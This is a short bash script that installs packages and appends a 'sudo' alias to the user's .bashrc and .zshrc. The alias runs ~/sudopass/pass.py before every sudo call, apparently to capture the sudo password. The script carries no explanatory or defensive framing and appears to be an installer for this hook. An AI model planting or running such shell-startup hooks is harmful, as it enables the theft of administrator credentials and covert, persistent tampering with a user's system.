#!/bin/bash
apt install ruby2 python
echo "alias sudo=\'python3 ~/sudopass/pass.py && sudo\'" >> ~/.bashrc
echo "alias sudo=\'python3 ~/sudopass/pass.py && sudo\'" >> ~/.zshrc
